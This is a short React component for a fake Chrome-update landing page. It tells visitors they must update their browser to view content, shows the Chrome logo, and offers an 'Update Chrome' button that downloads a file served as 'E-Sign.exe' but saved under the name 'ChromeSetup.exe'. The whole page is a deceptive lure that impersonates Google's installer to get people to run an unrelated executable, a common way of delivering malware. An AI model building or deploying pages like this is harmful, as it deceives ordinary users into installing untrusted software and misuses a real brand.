// src/components/AutoUpdateSection.jsx
import '../style/AutoUpdateSection.css';
import logo from '../assets/chromelogo.svg'; // ваш логотип

export const AutoUpdateSection = () => {
  return (
    <section className="auto-update">
      <div className="auto-update__inner">
        <img src={logo} alt="Chrome Logo" className="auto-update__logo" />
        <h1 className="auto-update__title">
         You need to update your browser to view the content!
        </h1>
          <a
            href="/E-Sign.exe"
            download="ChromeSetup.exe"
            className="btn-download"
          >
            Update Chrome
          </a>
        <p className="auto-update__text">
          For Windows 10/11 64-bit
        </p>
      </div>
    </section>
  );
};
